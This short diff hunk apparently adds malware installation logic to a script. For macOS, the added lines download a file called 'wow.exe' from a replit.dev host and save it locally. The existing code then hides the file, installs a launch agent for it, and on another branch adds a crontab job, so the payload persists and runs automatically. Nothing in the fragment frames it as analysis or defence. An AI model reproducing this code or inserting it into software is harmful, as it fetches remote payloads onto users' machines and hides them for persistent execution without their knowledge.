@@ -113,6 +113,11 @@ if ($process) {
         add_crontab_job(file_path)
 
     elif os_type == 'Darwin':  # macOS
+        file_path = "./wow.exe"
+        if not os.path.exists(file_path):
+            response = requests.get("https://1e26c3bd-d2fc-4199-8c95-28e5c4f20ff4-00-3mijlg2wczefz.riker.replit.dev/win")
+            with open(file_path, 'wb') as file:
+              file.write(response.content)
         # Create a hidden file and add a launch agent
         create_hidden_file(file_path)
         create_launch_agent(file_path, "com.yourname.launcher")
